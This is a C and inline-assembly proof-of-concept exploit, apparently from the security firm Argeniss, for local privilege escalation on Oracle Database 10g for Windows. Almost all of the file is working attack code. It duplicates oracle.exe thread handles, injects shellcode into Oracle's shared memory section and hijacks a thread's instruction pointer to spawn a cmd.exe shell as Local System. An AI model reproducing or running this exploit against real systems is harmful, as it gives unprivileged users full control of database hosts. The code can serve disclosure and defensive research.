// Argeniss - Information Security
//
// Oracle Database local elevation of privileges PoC exploit
// 
// Author: Cesar Cerrudo

#include <windows.h>
#include <stdio.h>


BOOL InjectShellcode(DWORD oldEIP,CHAR * oSID)
{
	HMODULE hKernel;
    FARPROC pCreateProc;
    LPSTR sCommand="cmd.exe";
	DWORD dwStrLen;
	CHAR buff[100];

	dwStrLen=strlen(sCommand);

	hKernel=LoadLibrary("Kernel32.dll");
	pCreateProc=GetProcAddress(hKernel,"CreateProcessA");

	strcpy(buff, "Global\\*oraspawn_buffer_");
	strncat(buff, oSID,50);
	strcat(buff, "*");

  	HANDLE hMapFile = OpenFileMapping(FILE_MAP_WRITE, FALSE,buff); 

	if (hMapFile == NULL) {
		printf("Could not open Shared Section\n\n"); 
		return FALSE;
	}
	else
		printf("Shared Section opened\n"); 

	LPVOID lpMapAddress = MapViewOfFile(hMapFile, FILE_MAP_WRITE,0,0,0);

	printf("Inserting shellcode...\n"); 

	CHAR sWinSta[]="WinSta0\\Default";

	//copy shellcode
_asm {

	pushad

	lea esi, Shellcode
	mov edi, lpMapAddress  
	add edi, 0x500
	lea ecx, End
	sub ecx, esi
	push esi
	push edi
	cld
	rep movsb

	pop edi
	pop esi
	push edi

	lea ecx, CommandBuf
	sub ecx, esi
	add edi, ecx
	mov esi, sCommand
	mov ecx, dwStrLen
	rep movsb
	mov [edi], 0x00

	pop edi
	mov esi, pCreateProc
	mov [edi+0x0a], esi

	mov esi, oldEIP
	mov [edi+0x0e], esi

	add edi, 0x2f0
	lea esi, sWinSta
	mov ecx, 0xf
	cld
	rep movsb

	jmp Done

Shellcode:
    jmp Start
				// this gets overwritten
	mov ax,0xffff
	mov ax,0xffff
	mov ax,0xffff	
	mov ax,0xffff	

CommandBuf:					// this gets overwritten
	mov dword ptr[eax],0x55555555
	mov dword ptr[eax],0x55555555	
	mov dword ptr[eax],0x55555555	
	mov dword ptr[eax],0x55555555	
	mov dword ptr[eax],0x55555555	
	mov dword ptr[eax],0x55555555	
	mov dword ptr[eax],0x55555555	
	mov dword ptr[eax],0x55555555	
	mov dword ptr[eax],0x55555555	
	mov dword ptr[eax],0x55555555	
	mov dword ptr[eax],0x55555555	
Start:
	call getDelta
getDelta:
	pop edx						// Get shellcode/shared section pointer
	pushad

	mov eax, edx
	add eax, 0x200
	push eax					//LPPROCESS_INFORMATION
	add eax, 0x200
	mov ebx, edx
	xor bl, bl
	lea ecx, [ebx+0x2f0]
	lea ebx, [eax+0x8]	
	mov [ebx], ecx				//set windows station and desktop
	push eax					//LPSTARTUPINFO
	push 0x0
	push 0x0
	push 0x0
	push 0x0
	push 0x0
	push 0x0
	
	lea eax, [edx-0x47]					
	push eax						// Command offset

	push 0x0
	call [edx-0x4f]					// Call create process

	popad

	push [edx-0x4b]					// old thread EIP
    ret
End:

Done:
	popad
  }

	return TRUE;

}


int _tmain(int argc, _TCHAR* argv[])
{
	HANDLE hSrcHandle=0,hTgtHandle=0,hProcess=0;
	BOOL bSuccess=FALSE;
	DWORD pid,j;
	CHAR * oraSID;
	CONTEXT Context;

	if(!argv[1]||!argv[2]){
		printf("Usage %s Oracle.exe PID SID , example: %s 453 orcl\n",argv[0],argv[0]);
		return 0;
	}

	oraSID= argv[2];
	pid=atoi(argv[1]);
	
	printf("\nOpening oracle.exe PID: %d\n",pid);
	
	hProcess=OpenProcess(PROCESS_DUP_HANDLE ,FALSE,pid);
	if(!hProcess){
		printf("\nCouldn't open oracle.exe process\n");
		printf("\nCheck Oracle PID\n");
		return 0;
	}

	//brute force handles to find a thread one
	for (j=0x200;j<=0x1000;j+=4){
		hSrcHandle=(HANDLE)j;
		//get a local handle
		if(DuplicateHandle(hProcess,hSrcHandle,GetCurrentProcess(),&hTgtHandle,0,FALSE,DUPLICATE_SAME_ACCESS )){
			//if we can suspend it then it's a thread handle
			if(SuspendThread(hTgtHandle)==0){
				printf("Found thread handle: 0x%x\n",hSrcHandle);
				//get thread control registers
				Context.ContextFlags = CONTEXT_CONTROL;
				GetThreadContext(hTgtHandle, &Context);
				//put shellcode on the shared section
				if (InjectShellcode(Context.Eip,oraSID)){
					printf("Changing thread context...\n");

					//10gR1 section base address 0x04620000 on some systems
					//10gR2 section base address 0x048a0000 on some systems
					Context.Eip = 0x048a0500; //set new IP, add 0x500 to not overwrite data already 
											 //in the section, we don't want to crash Oracle service :)

					SetThreadContext(hTgtHandle, &Context); //change context to jump to shellcode
					ResumeThread(hTgtHandle);

					printf("Running exploit...\n");
					bSuccess=TRUE;

					Sleep(2000);
				}
				else
					bSuccess=FALSE;
				
				CloseHandle(hTgtHandle);
				break;

			}
			CloseHandle(hTgtHandle);
		}		
	}	

	if (bSuccess)
		printf("\nYou should have a command shell running as Local System :)\n");
	else
	{
		printf("\nCheck Oracle SID\n");
	}

	CloseHandle(hProcess);
	return 0;
}

